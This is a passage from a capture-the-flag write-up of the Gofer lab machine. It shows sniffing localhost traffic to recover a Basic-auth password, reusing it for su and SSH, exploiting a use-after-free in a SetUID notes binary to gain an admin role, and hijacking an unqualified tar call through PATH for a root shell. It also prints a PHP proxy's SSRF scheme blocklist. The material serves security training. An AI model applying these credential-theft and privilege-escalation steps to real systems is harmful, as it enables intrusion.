lo    In  IP 127.0.0.1.39912 > 127.0.0.1.80: tcp 0
lo    In  IP 127.0.0.1.39912 > 127.0.0.1.80: tcp 48
lo    In  IP 127.0.0.1.80 > 127.0.0.1.39912: tcp 0
lo    In  IP 127.0.0.1.80 > 127.0.0.1.39912: tcp 29635
lo    In  IP 127.0.0.1.39912 > 127.0.0.1.80: tcp 0
lo    In  IP 127.0.0.1.80 > 127.0.0.1.39906: tcp 16348
lo    In  IP 127.0.0.1.39906 > 127.0.0.1.80: tcp 0
lo    In  IP 127.0.0.1.80 > 127.0.0.1.39906: tcp 13259
lo    In  IP 127.0.0.1.39906 > 127.0.0.1.80: tcp 0
lo    In  IP 127.0.0.1.39912 > 127.0.0.1.80: tcp 0
lo    In  IP 127.0.0.1.80 > 127.0.0.1.39906: tcp 11
lo    In  IP 127.0.0.1.39906 > 127.0.0.1.80: tcp 0
lo    In  IP 127.0.0.1.80 > 127.0.0.1.39912: tcp 0
lo    In  IP 127.0.0.1.39912 > 127.0.0.1.80: tcp 0
lo    In  IP 127.0.0.1.39906 > 127.0.0.1.80: tcp 0
lo    In  IP 127.0.0.1.80 > 127.0.0.1.39906: tcp 0
lo    In  IP 127.0.0.1.39906 > 127.0.0.1.80: tcp 0
lo    In  IP 127.0.0.1.42674 > 127.0.0.1.631: tcp 0
lo    In  IP 127.0.0.1.631 > 127.0.0.1.42674: tcp 0
^C
26 packets captured
52 packets received by filter
0 packets dropped by kernel

```

There are two ports contacted - someone on localhost talking to port 80, and someone on local host talking to 631 (cups printing service).

#### GET Requests

ChatGPT helped me write this `tcpdump` command to just see GET request data, and it works:

```
jhudson@gofer:/etc/apache2$ sudo tcpdump -i any -nn -A 'tcp port 80 and (tcp[((tcp[12:1] & 0xF0) >> 2):4] = 0x47455420)'
bash: sudo: command not found
jhudson@gofer:/etc/apache2$ tcpdump -i any -nn -A 'tcp port 80 and (tcp[((tcp[12:1] & 0xF0) >> 2):4] = 0x47455420)'
tcpdump: data link type LINUX_SLL2
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
14:10:01.986142 lo    In  IP 127.0.0.1.58472 > 127.0.0.1.80: Flags [P.], seq 1376021622:1376021785, ack 1661516285, win 512, options [nop,nop,TS val 3293898230 ecr 3293898230], length 163: HTTP: GET /?url=http:/
/gofer.htb HTTP/1.1
E....r@.@............h.PR.lvc..............
.T...T..GET /?url=http://gofer.htb HTTP/1.1
Host: proxy.gofer.htb
Authorization: Basic dGJ1Y2tsZXk6b29QNGRpZXRpZTNvX2hxdWFldGk=
User-Agent: curl/7.74.0
Accept: */*

14:10:01.987970 lo    In  IP 127.0.0.1.58478 > 127.0.0.1.80: Flags [P.], seq 3083973505:3083973553, ack 4056441888, win 512, options [nop,nop,TS val 3293898232 ecr 3293898232], length 48: HTTP: GET / HTTP/1.1
E..d..@.@.o..........n.P......d .....X.....
.T...T..GET / HTTP/1.1
Host: gofer.htb
Accept: */*

```

There’s two GET requests there. First to `proxy.gofer.htb` requesting `gofer.htb`, and then to `gofer.htb`. The first one has the `Authorization` header, which is just the base64-encoded username then colon then password:

```
jhudson@gofer:/etc/apache2$ echo "dGJ1Y2tsZXk6b29QNGRpZXRpZTNvX2hxdWFldGk=" | base64 -d
tbuckley:ooP4dietie3o_hquaeti

```

### su / SSH

That password for tbuckley works as the password for the user on Gofer as well:

```
jhudson@gofer:/etc/apache2$ su - tbuckley
Password:
tbuckley@gofer:~$

```

It also works over SSH:

```
oxdf@hacky$ sshpass -p ooP4dietie3o_hquaeti ssh tbuckley@gofer.htb
Linux gofer.htb 5.10.0-23-amd64 #1 SMP Debian 5.10.179-2 (2023-07-14) x86_64
...[snip]...
You have no mail.
tbuckley@gofer:~$

```

## Shell as root

### notes Enumeration

At this point, there isn’t much enumeration needed, as I now have access to a SetUID/SetGID binary running as root. This seems like the clear path forward. I’m going to show exploiting this binary without opening it in Ghidra or `gdb`, but rather just playing with it, as I initially solved this. I’ll do some reversing in [Beyond Root](#notes-binary).

I always want to start with playing with the intended functionality of the application before trying to hack it.

Running `notes` presents a menu:

```
tbuckley@gofer:~$ notes
========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================

Your choice:

```

`1` prompt for user name:

```
Your choice: 1

Choose an username: 0xdf

```

And then re-print the menu. `2` shows that result:

```
Your choice: 2

Username: 0xdf
Role: user

```

There’s some kind of role attached here. If I quit and try to run `2` before `1`, it doesn’t work:

```
Your choice: 2

First create an user!

```

`3` (delete) has no output, just reprints the menu. Running `2` now doesn’t error, but shows an empty username:

```
Your choice: 2

Username:
Role: user

```

That’s weird, and potentially an issue.

`4` offers a chance to create a note:

```
Your choice: 4

Write your note:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

```

Assuming I have a valid user (not like shown above), this doesn’t impact the user, and the note prints back with `5`:

```
Your choice: 2

Username: 0xdf
Role: user
...[snip]...
Your choice: 5

Note: AAAAAAAAAAAAAAAAA

```

Only part of the note prints. If I enter a different note, it just crashes the program:

```
Write your note:
123456789012345678901234567890123456789012345678901234567890
========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================

Your choice:
tbuckley@gofer:~$

```

`6` is not implemented. If I run `7` to delete a note, then `5` shows `(null`):

```
Your choice: 5

Note: (null)

```

If I try to run `8`, it rejects the choice because I don’t have the admin role:

```
Your choice: 8

Access denied: you don't have the admin role!

```

### admin Role

#### Identify Overflow

While I can reverse this binary, I actually stumbled across some overflows accidentally while playing with the intended functionality.

I created a user, and then deleted it. Then I’ll move on to creating a note:

```
Write your note:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

```

Now when I view my user ( `2`), it’s overwritten:

```
Your choice: 2

Username: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Role: AAAAAAAAAAAAAAA

```

My guess here is that either these are stored on the stack in fixed buffers that are overflowable, or they are on the heap and the username pointer is not-nulled when the buffer is free. So if my note is too long and not checked, it overwrites into the username and role.

This doesn’t happen if the user isn’t deleted, so there must be some check for an active user before allowing the write.

#### Exploit

To understand where exactly the overflow is happening, I’ll use the `pattern_create` utility from Metasploit:

```
oxdf@hacky$ pattern_create -l 30
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9

```

I’ll start the program, create a user, delete the user, and then create a note with that pattern as the body. Then on viewing the user data:

```
Username: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9
Role: Aa8Aa9

```

The username now matches the note exactly! And the roles starts 24 bytes in:

```
oxdf@hacky$ pattern_offset -q Aa0A
[*] Exact match at offset 0
oxdf@hacky$ pattern_offset -q Aa8A
[*] Exact match at offset 24

```

To get admin, I’ll again delete the user ( `3`), then add a note with 24 bytes of anything, and then “admin”:

```
Your choice: 4

Write your note:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7admin

```

Now it says I have admin:

```
Your choice: 2

Username: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7admin
Role: admin

```

And if I enter `8`, it says “Access granted!” before erroring out:

```
Your choice: 8

Access granted!
tar: Removing leading `/' from member names
/opt/notes/

```

`/opt/notes/` is empty.

### Exploit tar

#### Identify tar Command

The error seems to have an issue with `tar`. I’ll run `strings` on the binary to see if the command is in there, and it is:

```
tbuckley@gofer:~$ strings /usr/local/bin/notes | grep 'tar '
tar -czvf /root/backups/backup_notes.tar.gz /opt/notes

```

#### Path Hijack

The good news for me is that it is calling `tar` without a full path, which means I can likely hijack `tar`.

I’ll go into `/dev/shm` and create my own `tar` file:

This literally just drops into an interactive Bash shell. I’ll make sure to make `tar` executable.

I’ll update my `$PATH` variable for my current session:

```
tbuckley@gofer:/dev/shm$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
tbuckley@gofer:/dev/shm$ export PATH=.:$PATH
tbuckley@gofer:/dev/shm$ echo $PATH
.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

```

Now the current directory is the first item in the path.

From here, it’s just running the following steps:

1. Start `notes`
2. Option 1 to create a user.
3. Option 3 to delete the user.
4. Option 4 with a note of “Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7admin” to set myself admin.
5. Optionally I can verify that worked with option 2.
6. Option 8 to run `tar`.

It works:

```
Your choice: 8

Access granted!
root@gofer:/dev/shm#

```

I can grab `root.txt`:

```
root@gofer:/root# cat root.txt
1321cf4c************************

```

## Beyond Root

### notes Binary

I actually love binary exploitation that doesn’t rely on looking at assembly. It’s a really fun and beginner accessible way to show binary exploitation. That said, it’s still worth looking at this binary in assembly. I’ll download a copy and fire up Ghidra in [this video](https://www.youtube.com/watch?v=z4KZCwbTNy0):

Interestingly, the entire binary is basically one function. It has two variables that store pointers, both of which are initialized to null. When a user is created, memory from the heap is requested and the first pointer is set pointing to it. When a user is deleted, that memory is freed, but the pointer is not nulled. So when option two is called for user information, it prints out whatever is in that buffer.

So when a user is created and then deleted, it leaves a pointer to freed memory - the definition of a use after free vulnerability. Then when I create a note, the heap returns the same buffer, so now both the note pointer and the name pointer point to the note. If I set the role in that buffer, when it’s checked later it matches. Details in [the video](https://www.youtube.com/watch?v=z4KZCwbTNy0)!

### Proxy Bad Words

It is possible to trigger a block list in `index.php` on the proxy site. The directory has only a single PHP file:

```
root@gofer:/var/www/proxy# ls -la
total 16
drwxr-xr-x 2 root root 4096 Jul 19 12:44 .
drwxr-xr-x 4 root root 4096 Jul 19 12:44 ..
-rw-r--r-- 1 root root   49 Apr 28  2023 .htaccess
-rw-r--r-- 1 root root 2627 Jul 19 11:46 index.php

```

The page starts with the comment I saw in the responses, followed by the `is_blacklisted` function:

```
<!-- Welcome to Gofer proxy -->
<?php

function is_blacklisted($url) {
    $keywords = array("localhost", "/127", "about://", "acap://", "addbook://", "afp://", "afs://", "aim://", "applescript://", "bcp://", "bk://", "btspp://", "callto://", "castanet://", "cdv://", "chrome://", "
chttp://", "cid://", "crid://", "data://", "dav://", "daytime://", "device://", "dict://", "dns://", "doi://", "dtn://", "ed2k://", "eid://", "enp://", "fax://", "feed://", "file://", "finger://", "freenet://",
"ftp://", "go://", "gsiftp://", "gsm-sms://", "h323://", "h324://", "hdl://", "hnews://", "httpsy://", "iioploc://", "ilu://", "im://", "imap://", "info://", "ior://", "ip://", "ipp://", "irc://", "iris.beep://"
, "itms://", "jar://", "javascript://", "jdbc://", "klik://", "kn://", "lastfm://", "ldap://", "lifn://", "livescript://", "lrq://", "mac://", "magnet://", "mailbox://", "mailserver://", "mailto://", "man://", "
md5://", "mid://", "mms://", "mocha://", "modem://", "moz-abmdbdirectory://", "msni://", "mtqp://", "mumble://", "mupdate://", "myim://", "news://", "nltk://", "nfs://", "nntp://", "oai://", "opaquelocktoken://"
, "pcast://", "phone://", "php://", "pop://", "pop3://", "press://", "printer://", "prospero://", "pyimp://", "rdar://", "res://", "rtsp://", "rvp://", "rwhois://", "rx://", "sdp://", "secondlife://", "service://
", "sip://", "sips://", "smb://", "smtp://", "snews://", "snmp://", "soap.beep://", "soap.beeps://", "soap.udp://", "subethaedit://", "svn://", "svn\+ssh://", "t120://", "tag://", "tann://", "tcp://", "tel://",
"telephone://", "telnet://", "tftp://", "thismessage://", "tip://", "tn3270://", "tv://", "txmt://", "uddi://", "urn://", "uuid://", "vemmi://", "videotex://", "view-source://", "wais://", "wcap://", "webcal://"
, "whodp://", "whois://", "wpn://", "wtai://", "xeerkat://", "xfire://", "xmlrpc.beep://", "xmlrpc.beeps://", "xmpp://", "ymsgr://", "z39.50r://", "z39.50s");

    foreach ($keywords as $k) {
        if(strpos(strtolower($url), "$k") !== false) {
            return $k;
        }
    }

    return false;
}

```

It seems to block “localhost”, “127”, and then a ton of possible schemes. This is not a very interesting or realistic filter, but it makes for an interesting challenge.

The rest of the page uses `curl` to make a query to the value of the URL parameters (if it’s not blocklisted), and then returns the result.

```
if(!empty($_GET["url"])) {

    $url = $_GET["url"];

    $is_blacklisted = is_blacklisted($url);

    if($is_blacklisted === false) {

        $url = $_GET["url"];
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $url);
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
        $output = curl_exec($c);
        curl_close($c);

        echo $output;
    }
    else {
        echo "<html><body>Blacklisted keyword: $is_blacklisted !</body></html>";
    }
} else {
    echo "<html><body>Missing URL parameter !</body></html>";
}
?>

```





